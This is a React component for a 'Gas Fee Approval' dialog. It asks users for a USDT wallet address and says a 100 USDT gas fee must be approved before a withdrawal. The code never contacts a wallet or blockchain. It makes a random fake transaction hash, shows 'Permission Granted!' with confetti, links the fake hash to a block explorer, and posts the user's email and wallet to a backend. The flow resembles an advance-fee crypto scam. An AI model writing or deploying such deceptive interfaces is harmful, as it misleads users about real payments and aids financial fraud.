"use client"

import { useState, useEffect } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Loader2, CheckCircle2, AlertCircle, Wallet, Shield, Zap } from "lucide-react"
import { Progress } from "@/components/ui/progress"
import confetti from "canvas-confetti"
import { useToast } from "@/hooks/use-toast"

type ApprovalStep = "connect" | "requesting" | "pending" | "success" | "error"

interface GasFeeApprovalDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onSuccess?: (txHash: string, walletAddress: string) => void
}

export function GasFeeApprovalDialog({ open, onOpenChange, onSuccess }: GasFeeApprovalDialogProps) {
  const [step, setStep] = useState<ApprovalStep>("connect")
  const [walletAddress, setWalletAddress] = useState("")
  const [countdown, setCountdown] = useState(30)
  const [txHash, setTxHash] = useState("")
  const { toast } = useToast()

  useEffect(() => {
    if (step === "success") {
      const interval = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(interval)
            return 0
          }
          return prev - 1
        })
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [step])

  useEffect(() => {
    if (!open) {
      setTimeout(() => {
        setStep("connect")
        setWalletAddress("")
        setCountdown(30)
        setTxHash("")
      }, 300)
    }
  }, [open])

  const handleConnectWallet = () => {
    if (!walletAddress || walletAddress.length < 10) {
      toast({
        title: "Invalid Address",
        description: "Please enter a valid wallet address",
        variant: "destructive",
      })
      return
    }

    setStep("requesting")

    setTimeout(() => {
      setStep("pending")

      const mockTxHash = `0x${Math.random().toString(16).slice(2)}${Math.random().toString(16).slice(2)}${Math.random().toString(16).slice(2)}`
      setTxHash(mockTxHash)

      setTimeout(() => {
        setStep("success")
        confetti({
          particleCount: 100,
          spread: 70,
          origin: { y: 0.6 },
        })

        fetch("/api/participant/gas-approval", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            participantEmail: sessionStorage.getItem("participantEmail"),
            walletAddress,
            txHash: mockTxHash,
            amount: "100",
            token: "USDT",
          }),
        })

        if (onSuccess) {
          onSuccess(mockTxHash, walletAddress)
        }
      }, 3000)
    }, 2000)
  }

  const getProgress = () => {
    switch (step) {
      case "connect":
        return 0
      case "requesting":
        return 33
      case "pending":
        return 66
      case "success":
        return 100
      default:
        return 0
    }
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-md bg-white border-slate-200">
        <DialogHeader>
          <DialogTitle className="text-xl font-bold text-slate-900">Gas Fee Approval</DialogTitle>
          <DialogDescription className="text-slate-500">
            Approve gas fee transaction to proceed with withdrawal
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6 py-4">
          {/* Progress Bar */}
          <div className="space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-slate-600">Progress</span>
              <span className="font-medium text-violet-600">{getProgress()}%</span>
            </div>
            <Progress value={getProgress()} className="h-2" />
          </div>

          {/* Step Indicators */}
          <div className="flex items-center justify-between">
            <div className="flex flex-col items-center gap-2 flex-1">
              <div
                className={`h-12 w-12 rounded-full flex items-center justify-center transition-colors ${
                  step === "connect" ? "bg-violet-100 text-violet-600" : "bg-emerald-100 text-emerald-600"
                }`}
              >
                <Wallet className="h-6 w-6" />
              </div>
              <span className="text-xs text-slate-600">Connect</span>
            </div>

            <div className="h-px flex-1 bg-slate-200" />

            <div className="flex flex-col items-center gap-2 flex-1">
              <div
                className={`h-12 w-12 rounded-full flex items-center justify-center transition-colors ${
                  step === "requesting" || step === "pending"
                    ? "bg-violet-100 text-violet-600"
                    : step === "success"
                      ? "bg-emerald-100 text-emerald-600"
                      : "bg-slate-100 text-slate-400"
                }`}
              >
                <Shield className="h-6 w-6" />
              </div>
              <span className="text-xs text-slate-600">Approve</span>
            </div>

            <div className="h-px flex-1 bg-slate-200" />

            <div className="flex flex-col items-center gap-2 flex-1">
              <div
                className={`h-12 w-12 rounded-full flex items-center justify-center transition-colors ${
                  step === "success" ? "bg-emerald-100 text-emerald-600" : "bg-slate-100 text-slate-400"
                }`}
              >
                <Zap className="h-6 w-6" />
              </div>
              <span className="text-xs text-slate-600">Complete</span>
            </div>
          </div>

          {/* Main Content Area */}
          <div className="p-6 rounded-xl bg-gradient-to-br from-slate-50 to-slate-100 border border-slate-200">
            {step === "connect" && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="wallet" className="text-slate-700">
                    Wallet Address
                  </Label>
                  <Input
                    id="wallet"
                    placeholder="0x..."
                    value={walletAddress}
                    onChange={(e) => setWalletAddress(e.target.value)}
                    className="font-mono text-sm"
                  />
                  <p className="text-xs text-slate-500">Enter your USDT (BEP20) wallet address</p>
                </div>
              </div>
            )}

            {step === "requesting" && (
              <div className="text-center space-y-4">
                <Loader2 className="h-12 w-12 animate-spin text-violet-600 mx-auto" />
                <div>
                  <p className="font-medium text-slate-900">Requesting Approval</p>
                  <p className="text-sm text-slate-500 mt-1">Please confirm the transaction in your wallet</p>
                </div>
              </div>
            )}

            {step === "pending" && (
              <div className="text-center space-y-4">
                <Loader2 className="h-12 w-12 animate-spin text-violet-600 mx-auto" />
                <div>
                  <p className="font-medium text-slate-900">Processing Transaction</p>
                  <p className="text-sm text-slate-500 mt-1">Waiting for blockchain confirmation</p>
                </div>
              </div>
            )}

            {step === "success" && (
              <div className="text-center space-y-4">
                <CheckCircle2 className="h-12 w-12 text-emerald-600 mx-auto" />
                <div>
                  <p className="font-medium text-slate-900">Permission Granted!</p>
                  <p className="text-sm text-slate-500 mt-1">Gas fee approval successful</p>
                  <div className="mt-4 p-3 bg-violet-50 rounded-lg">
                    <p className="text-xs text-violet-700">Verification Pending</p>
                    <p className="text-2xl font-bold text-violet-600 mt-1">{countdown}s</p>
                  </div>
                </div>
              </div>
            )}

            {step === "error" && (
              <div className="text-center space-y-4">
                <AlertCircle className="h-12 w-12 text-red-600 mx-auto" />
                <div>
                  <p className="font-medium text-slate-900">Transaction Failed</p>
                  <p className="text-sm text-slate-500 mt-1">Please try again</p>
                </div>
              </div>
            )}
          </div>

          {/* Transaction Details */}
          <div className="space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-slate-500">Token:</span>
              <span className="font-medium text-slate-900">USDT (BEP20)</span>
            </div>
            <div className="flex justify-between">
              <span className="text-slate-500">Amount:</span>
              <span className="font-medium text-slate-900">100 USDT</span>
            </div>
            {walletAddress && (
              <div className="flex justify-between">
                <span className="text-slate-500">Your Wallet:</span>
                <span className="font-mono text-xs text-slate-600">
                  {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
                </span>
              </div>
            )}
            {txHash && (
              <div className="flex justify-between">
                <span className="text-slate-500">TX Hash:</span>
                <a
                  href={`https://bscscan.com/tx/${txHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="font-mono text-xs text-violet-600 hover:underline"
                >
                  {txHash.slice(0, 6)}...{txHash.slice(-4)}
                </a>
              </div>
            )}
          </div>

          {/* Action Buttons */}
          <div className="flex gap-3">
            <Button variant="outline" onClick={() => onOpenChange(false)} className="flex-1">
              Cancel
            </Button>
            {step === "connect" && (
              <Button onClick={handleConnectWallet} className="flex-1 bg-[#E85D3B] hover:bg-[#d14d2c] text-white">
                Approve Gas Fee
              </Button>
            )}
            {step === "success" && (
              <Button
                onClick={() => onOpenChange(false)}
                className="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white"
              >
                Done
              </Button>
            )}
            {step === "error" && (
              <Button onClick={handleConnectWallet} className="flex-1 bg-[#E85D3B] hover:bg-[#d14d2c] text-white">
                Try Again
              </Button>
            )}
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}
